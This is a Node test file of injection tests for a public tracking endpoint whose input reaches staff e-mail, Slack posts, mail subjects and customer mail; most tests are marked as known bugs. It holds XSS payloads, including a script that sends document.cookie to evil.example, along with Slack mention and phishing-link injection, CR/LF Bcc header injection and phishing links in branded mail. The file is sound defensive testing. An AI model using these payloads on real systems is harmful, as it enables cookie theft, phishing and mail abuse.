// Injection tests. /api/track is public and anonymous; everything a visitor types is
// interpolated into (a) HTML mail bodies read by staff in registreerumised@ksa.ee,
// (b) Slack mrkdwn, (c) mail SUBJECT lines, and (d) the customer-facing result e-mail that
// is sent from noreply@ksa.ee to whatever address was typed.
// Each test states the DESIRED behaviour (escaped / rejected). None of the output is
// escaped today, so these are marked as known bugs.
import test, { describe } from 'node:test';
import assert from 'node:assert/strict';
import { bug, makeWorld, payload, PERSON, EVENT_PAYLOADS, ANSWERS_FLOW3 } from './helpers/harness.mjs';

const XSS = '<img src=x onerror=alert(document.cookie)>';
const SCRIPT = '<script>fetch("https://evil.example/"+document.cookie)</script>';
const MRKDWN = '*bold* <!channel> <@U0123ABCD> <https://evil.example/login|Verify your account>';
const LINK = '<a href="https://evil.example/claim">Claim your free exam</a>';

const joinHtml = (calls) => calls.map((c) => c.json?.html || '').join('\n');
const slackText = (net) => net.slackLeads().map((c) => JSON.stringify(c.json)).join('\n');

describe('HTML in internal mail (registreerumised@ksa.ee)', () => {
  const cases = [
    ['email_captured', (v) => payload('email_captured', { email: PERSON.email, answers: { ...ANSWERS_FLOW3, gender: v, interest: v, prescription: v } })],
    ['form_with_contact (name)', (v) => payload('form_with_contact', { contact: { name: v, phone: PERSON.phone, email: PERSON.email } })],
    ['form_with_contact (phone)', (v) => payload('form_with_contact', { contact: { name: 'Mari', phone: v, email: PERSON.email } })],
    ['callback_requested (name)', (v) => payload('callback_requested', { contact: { name: v, phone: PERSON.phone, email: PERSON.email } })],
    ['qualified_flow3_phone_lead (name)', (v) => payload('qualified_flow3_phone_lead', { name: v, phone: PERSON.phone, email: PERSON.email })],
    ['book_now_clicked (name)', (v) => payload('book_now_clicked', { name: v, email: PERSON.email })],
  ];
  for (const [label, build] of cases) {
    bug('F-ESC-HTML', `${label}: <img onerror> and <script> are HTML-escaped in the internal mail body`, async (t) => {
      for (const vec of [XSS, SCRIPT]) {
        const w = await makeWorld('track');
        try {
          await w.post(build(vec));
          const html = joinHtml(w.net.resendInternal());
          assert.ok(html.length > 0, 'no internal mail produced');
          assert.ok(!html.includes(vec), `raw payload ${vec.slice(0, 20)}... present in internal mail HTML`);
        } finally { w.done(); }
      }
    });
  }
});

describe('Slack mrkdwn injection', () => {
  const cases = [
    ['email_captured (answers.interest)', () => payload('email_captured', { email: PERSON.email, answers: { ...ANSWERS_FLOW3, interest: MRKDWN, gender: MRKDWN } })],
    ['email_captured (email)', () => payload('email_captured', { email: `x${MRKDWN}@gmail.com` })],
    ['callback_requested (name)', () => payload('callback_requested', { contact: { name: MRKDWN, phone: PERSON.phone, email: PERSON.email } })],
    ['callback_requested (phone) inside <tel:..|..>', () => payload('callback_requested', { contact: { name: 'Mari', phone: `+372555>|x ${MRKDWN}`, email: PERSON.email } })],
    ['form_with_contact (name)', () => payload('form_with_contact', { contact: { name: MRKDWN, phone: PERSON.phone, email: PERSON.email } })],
    ['qualified_flow3_phone_lead (name)', () => payload('qualified_flow3_phone_lead', { name: MRKDWN, phone: PERSON.phone, email: PERSON.email })],
    ['phone_lead (phone)', () => payload('phone_lead', { phone: `+372${MRKDWN}` })],
    ['installment_lead (name)', () => payload('installment_lead', { contact: { name: MRKDWN, phone: PERSON.phone, email: PERSON.email } })],
    ['utm campaign -> source label', () => payload('email_captured', { email: PERSON.email, utm: { utm_source: 'newsletter', utm_campaign: MRKDWN } })],
  ];
  for (const [label, build] of cases) {
    bug('F-ESC-SLACK', `${label}: <!channel>, <@user> and <url|text> are neutralised (&lt; &gt; &amp;) in the Slack post`, async (t) => {
      const w = await makeWorld('track');
      t.after(() => w.done());
      await w.post(build());
      const text = slackText(w.net);
      // An address with markup in it is not an address: the event is dropped and nothing is posted.
      if (label === 'email_captured (email)') assert.ok(text.length === 0 || !text.includes('<!channel>'));
      else assert.ok(text.length > 0, 'no Slack post');
      assert.ok(!text.includes('<!channel>'), 'raw <!channel> would ping the whole channel');
      assert.ok(!text.includes('<@U0123ABCD>'), 'raw <@user> mention');
      assert.ok(!text.includes('<https://evil.example/login|Verify your account>'), 'raw phishing link');
    });
  }
});

describe('CR/LF in values that end up in mail headers / subjects', () => {
  for (const [label, build] of [
    ['form_with_contact name+phone -> subject', () => payload('form_with_contact', { contact: { name: 'Mari\r\nBcc: attacker@evil.example', phone: '+372555\r\nX-Evil: 1', email: PERSON.email } })],
    ['email_captured utm source -> subject', () => payload('email_captured', { email: PERSON.email, utm: { utm_source: 'news\r\nBcc: attacker@evil.example' } })],
  ]) {
    bug('F-ESC-CRLF', `${label}: no CR/LF reaches a subject line`, async (t) => {
      const w = await makeWorld('track');
      t.after(() => w.done());
      await w.post(build());
      for (const c of w.net.resend()) assert.ok(!/[\r\n]/.test(c.json.subject), `subject: ${JSON.stringify(c.json.subject)}`);
    });
  }

  test('callback_requested: the name never reaches the subject line (guard)', async (t) => {
    const w = await makeWorld('track');
    t.after(() => w.done());
    await w.post(payload('callback_requested', { contact: { name: 'Mari\r\nBcc: a@evil.example', phone: PERSON.phone, email: PERSON.email } }));
    for (const c of w.net.resend()) assert.ok(!/[\r\n]/.test(c.json.subject));
  });

  bug('F-ESC-EMAIL', 'email_captured with a non-address ("a@b.co\\r\\nBcc: x@evil.example", "a@b.co, c@d.co", "foo") sends NO customer mail (hasContactData only checks "non-empty")', async (t) => {
    const sent = [];
    for (const email of ['a@b.co\r\nBcc: x@evil.example', 'a@b.co, c@d.co', 'foo', 'a b@c.d', '<script>@x.y']) {
      const w = await makeWorld('track');
      try {
        await w.post(payload('email_captured', { email }));
        if (w.net.resendCustomer().length) sent.push(JSON.stringify(email));
      } finally { w.done(); }
    }
    assert.deepEqual(sent, [], `customer mail attempted to: ${sent.join(' ')}`);
  });
});

describe('customer-facing mail (sent from noreply@ksa.ee to the typed address)', () => {
  bug('F-PHISH', 'a client-supplied promoCode cannot inject HTML/links into the mail sent to a third party (content injection from the official sender = phishing)', async (t) => {
    const w = await makeWorld('track');
    t.after(() => w.done());
    await w.post(payload('email_captured', { email: 'victim@gmail.com', promoCode: LINK, code: LINK, result: 'good_candidate' }));
    const mail = w.net.resendCustomer()[0];
    assert.ok(mail, 'no customer mail');
    assert.ok(!mail.json.html.includes('https://evil.example'), 'attacker link delivered inside the KSA-branded mail');
  });

  bug('F-PHISH-ALLOWLIST', 'the server only ever puts KIIRTEST39 / BLOG139 / BLOGKIDS into customer mail, whatever the client sends', async (t) => {
    const w = await makeWorld('track');
    t.after(() => w.done());
    await w.post(payload('email_captured', { email: 'victim@gmail.com', promoCode: 'FREE-LASER-2026', result: 'good_candidate' }));
    const html = w.net.resendCustomer()[0].json.html;
    assert.ok(!html.includes('FREE-LASER-2026'));
  });

  bug('F-ESC-GUIDE', 'installment_lead: a name containing HTML is escaped in the guide mail that is sent to the typed address', async (t) => {
    const w = await makeWorld('track');
    t.after(() => w.done());
    await w.post(payload('installment_lead', { contact: { name: LINK, phone: PERSON.phone, email: 'victim@gmail.com' } }));
    const html = w.net.resendCustomer()[0].json.html;
    // Escaped text is inert; what must never happen is a live tag or link built from the name.
    assert.ok(!/<[^>]*evil\.example/.test(html), 'no tag or link carries the typed URL');
    assert.ok(!html.includes('<https://evil'), 'no raw angle-bracket link');
  });

  test('customer mail built from a normal payload contains the KIIRTEST39 code and a booking.ksa.ee button (regression guard)', async (t) => {
    const w = await makeWorld('track');
    t.after(() => w.done());
    await w.post(payload('email_captured', { email: PERSON.email }));
    const html = w.net.resendCustomer()[0].json.html;
    assert.ok(html.includes('KIIRTEST39'));
    assert.match(html, /href="https:\/\/booking\.ksa\.ee\/\?/);
  });
});
